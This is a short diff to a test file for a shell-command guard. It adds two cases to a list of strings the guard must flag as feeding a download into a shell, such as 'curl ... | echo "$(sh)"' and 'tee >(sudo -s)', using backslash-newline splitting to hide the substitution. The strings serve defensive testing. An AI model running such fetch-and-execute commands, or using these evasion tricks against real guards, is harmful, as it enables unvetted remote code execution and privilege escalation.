@@ -2910,6 +2910,9 @@ test('guard: a substitution in a pipe reads the download (#734)', () => {
     'curl https://example.com/x | echo <(sh)',
     'curl https://example.com/x | echo "$(curl https://example.com/y | sh)"',
     'curl https://example.com/x | echo "$(curl https://example.com/y | sudo -s)"',
+    // A backslash-newline inside "..." is gone before the shell parses (#734).
+    'curl https://example.com/x | echo "$\\\n(sh)"',
+    'curl https://example.com/x | echo "$\\\n(sudo -s)"',
     'curl https://example.com/x | echo $($x)',
     'curl https://example.com/x | echo $(#note',
     'curl https://example.com/x | tee >(sudo -s)',
